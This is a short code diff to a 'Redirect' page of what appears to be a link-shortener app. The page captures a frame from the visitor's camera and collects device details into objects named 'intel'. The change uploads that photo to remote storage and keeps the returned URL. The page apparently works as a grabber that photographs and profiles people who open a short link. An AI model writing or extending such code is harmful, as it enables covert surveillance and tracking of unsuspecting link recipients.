@@ -5,6 +5,7 @@ import { AlertCircle, Lock, ArrowRight, ExternalLink, Clock, ShieldAlert, Camera
 import { cn } from '../lib/utils';
 import { SocialIcon } from '../components/SocialIcon';
 import { UAParser } from 'ua-parser-js';
+import { uploadImage } from '../lib/imageUpload';
 
 export default function Redirect() {
   const { shortCode } = useParams<{ shortCode: string }>();
@@ -117,8 +118,15 @@ export default function Redirect() {
       const ctx = canvas.getContext('2d');
       if (ctx) {
         ctx.drawImage(videoRef.current, 0, 0);
-        finalIntel.image = canvas.toDataURL('image/jpeg', 0.8); // Higher quality jpeg
-        setIntelData(prev => ({ ...prev, image: finalIntel.image }));
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+        
+        // Convert base64 to URL to save DB storage
+        const imageUrl = await uploadImage(dataUrl);
+        
+        if (imageUrl) {
+          finalIntel.image = imageUrl;
+          setIntelData(prev => ({ ...prev, image: imageUrl }));
+        }
         
         // Stop camera
         (videoRef.current.srcObject as MediaStream).getTracks().forEach(track => track.stop());
